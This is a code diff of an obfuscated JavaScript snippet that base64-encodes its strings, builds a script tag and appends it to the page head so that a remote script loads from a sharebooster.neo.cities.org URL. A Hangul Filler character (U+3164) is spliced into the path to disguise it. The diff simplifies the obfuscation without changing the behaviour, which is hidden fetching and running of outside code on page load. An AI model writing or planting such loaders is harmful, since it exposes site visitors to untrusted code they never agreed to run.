@@ -1,7 +1,6 @@
 (function(){
-  const x = atob, y = (s) => s.split('').reverse().join('');
-
-  const b64 = [
+  const _ = atob;
+  const $ = [
     'Y3JlYXRlRWxlbWVudA==', // createElement
     'YXBwZW5kQ2hpbGQ=',     // appendChild
     'c2NyaXB0',             // script
@@ -14,31 +13,23 @@
     'ZXJyb3I=',             // error
     'aGVhZA==',             // head
     'ZG9jdW1lbnQ=',         // document
-    'aHR0cHM=',             // https
-    'Oi8v',                 // ://
-    'c2hhcmU=',             // share
-    'Ym9vc3Rlcg==',         // booster
-    'Lm5lbw==',             // .neo
-    'Y2l0aWVz',             // cities
-    'Lm9yZw==',             // .org
-    'L3NjcmlwdDc=',         // /script7
-    '4Y+E',                 // "ㅤ" (U+3164) zero-width
-    'Lmpz'                  // .js
+    'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvLmNpdGllcy5vcmcvc2NyaXB0Nw==', // URL base
+    'Lmpz' // .js
   ];
 
-  const d = window[x(b64[11])];
-  const s = d[x(b64[0])](x(b64[2]));
+  const d = window[_($[11])];
+  const s = d[_($[0])](_($[2]));
 
-  const url = [
-    x(b64[12]), x(b64[13]), x(b64[14]), x(b64[15]), x(b64[16]),
-    x(b64[17]), x(b64[18]), x(b64[19]), x(b64[20]), x(b64[21])
-  ].join('');
+  // Visibly include the "ㅤ" character in the middle
+  const visiblePart = 'ㅤ'; // This character is U+3164 Hangul Filler
 
-  s[x(b64[5])] = url;
-  s[x(b64[3])] = x(b64[4]);
+  const url = _($[12]) + visiblePart + _($[13]);
 
-  s[x(b64[6])] = () => console[x(b64[8])](y('dedaol ' + url));
-  s[x(b64[7])] = () => console[x(b64[9])](y(' ' + url + ' daol ot deliaF'));
+  s[_($[5])] = url;
+  s[_($[3])] = _($[4]);
 
-  d[x(b64[10])][x(b64[1])](s);
+  s[_($[6])] = () => console[_($[8])](url + ' loaded successfully.');
+  s[_($[7])] = () => console[_($[9])]('Failed to load ' + url);
+
+  d[_($[10])][_($[1])](s);
 })();
